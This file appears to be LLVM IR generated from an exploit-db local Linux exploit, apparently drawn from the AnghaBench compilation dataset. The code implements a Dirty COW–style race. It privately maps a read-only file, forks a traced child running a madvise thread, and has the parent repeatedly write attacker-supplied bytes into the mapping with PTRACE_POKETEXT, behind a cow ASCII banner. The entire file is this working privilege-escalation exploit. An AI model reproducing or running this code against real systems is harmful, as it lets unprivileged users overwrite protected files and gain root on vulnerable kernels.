; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40838.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_40838.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i64 }

@.str = private unnamed_addr constant [297 x i8] c"%s                               \0A   (___)                                   \0A   (o o)_____/                             \0A    @@ `     \\                            \0A     \\ ____, /%s                          \0A     //    //                              \0A    ^^    ^^                               \0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@f = common dso_local global i32 0, align 4
@st = common dso_local global %struct.TYPE_3__ zeroinitializer, align 8
@PROT_READ = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@map = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [11 x i8] c"mmap %lx\0A\0A\00", align 1
@pid = common dso_local global i64 0, align 8
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [12 x i8] c"ptrace %d\0A\0A\00", align 1
@pth = common dso_local global i32 0, align 4
@madviseThread = common dso_local global i32 0, align 4
@PTRACE_TRACEME = common dso_local global i32 0, align 4
@SIGSTOP = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 3
  br i1 %12, label %13, label %14

13:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %106

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 2
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([297 x i8], [297 x i8]* @.str, i64 0, i64 0), i8* %17, i8* %20)
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = load i32, i32* @O_RDONLY, align 4
  %26 = call i32 @open(i8* %24, i32 %25)
  store i32 %26, i32* @f, align 4
  %27 = load i32, i32* @f, align 4
  %28 = call i32 @fstat(i32 %27, %struct.TYPE_3__* @st)
  %29 = load i64, i64* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @st, i32 0, i32 0), align 8
  %30 = add i64 %29, 8
  %31 = load i32, i32* @PROT_READ, align 4
  %32 = load i32, i32* @MAP_PRIVATE, align 4
  %33 = load i32, i32* @f, align 4
  %34 = call i64 @mmap(i32* null, i64 %30, i32 %31, i32 %32, i32 %33, i32 0)
  store i64 %34, i64* @map, align 8
  %35 = load i64, i64* @map, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i64 %35)
  %37 = call i64 (...) @fork()
  store i64 %37, i64* @pid, align 8
  %38 = load i64, i64* @pid, align 8
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %95

40:                                               ; preds = %14
  %41 = load i64, i64* @pid, align 8
  %42 = call i32 @waitpid(i64 %41, i32* null, i32 0)
  store i32 0, i32* %9, align 4
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @strlen(i8* %45)
  store i32 %46, i32* %10, align 4
  store i32 0, i32* %7, align 4
  br label %47

47:                                               ; preds = %89, %40
  %48 = load i32, i32* %7, align 4
  %49 = load i32, i32* %10, align 4
  %50 = sdiv i32 10000, %49
  %51 = icmp slt i32 %48, %50
  br i1 %51, label %52, label %92

52:                                               ; preds = %47
  store i32 0, i32* %8, align 4
  br label %53

53:                                               ; preds = %85, %52
  %54 = load i32, i32* %8, align 4
  %55 = load i32, i32* %10, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %88

57:                                               ; preds = %53
  store i32 0, i32* %6, align 4
  br label %58

58:                                               ; preds = %81, %57
  %59 = load i32, i32* %6, align 4
  %60 = icmp slt i32 %59, 10000
  br i1 %60, label %61, label %84

61:                                               ; preds = %58
  %62 = load i32, i32* @PTRACE_POKETEXT, align 4
  %63 = load i64, i64* @pid, align 8
  %64 = load i64, i64* @map, align 8
  %65 = load i32, i32* %8, align 4
  %66 = sext i32 %65 to i64
  %67 = add nsw i64 %64, %66
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 2
  %70 = load i8*, i8** %69, align 8
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = bitcast i8* %73 to i64*
  %75 = load i64, i64* %74, align 8
  %76 = call i64 (i32, ...) @ptrace(i32 %62, i64 %63, i64 %67, i64 %75)
  %77 = load i32, i32* %9, align 4
  %78 = sext i32 %77 to i64
  %79 = add nsw i64 %78, %76
  %80 = trunc i64 %79 to i32
  store i32 %80, i32* %9, align 4
  br label %81

81:                                               ; preds = %61
  %82 = load i32, i32* %6, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %6, align 4
  br label %58

84:                                               ; preds = %58
  br label %85

85:                                               ; preds = %84
  %86 = load i32, i32* %8, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %8, align 4
  br label %53

88:                                               ; preds = %53
  br label %89

89:                                               ; preds = %88
  %90 = load i32, i32* %7, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %7, align 4
  br label %47

92:                                               ; preds = %47
  %93 = load i32, i32* %9, align 4
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i32 %93)
  br label %105

95:                                               ; preds = %14
  %96 = load i32, i32* @madviseThread, align 4
  %97 = call i32 @pthread_create(i32* @pth, i32* null, i32 %96, i32* null)
  %98 = load i32, i32* @PTRACE_TRACEME, align 4
  %99 = call i64 (i32, ...) @ptrace(i32 %98)
  %100 = call i32 (...) @getpid()
  %101 = load i32, i32* @SIGSTOP, align 4
  %102 = call i32 @kill(i32 %100, i32 %101)
  %103 = load i32, i32* @pth, align 4
  %104 = call i32 @pthread_join(i32 %103, i32* null)
  br label %105

105:                                              ; preds = %95, %92
  store i32 0, i32* %3, align 4
  br label %106

106:                                              ; preds = %105, %13
  %107 = load i32, i32* %3, align 4
  ret i32 %107
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fstat(i32, %struct.TYPE_3__*) #1

declare dso_local i64 @mmap(i32*, i64, i32, i32, i32, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @waitpid(i64, i32*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @ptrace(i32, ...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
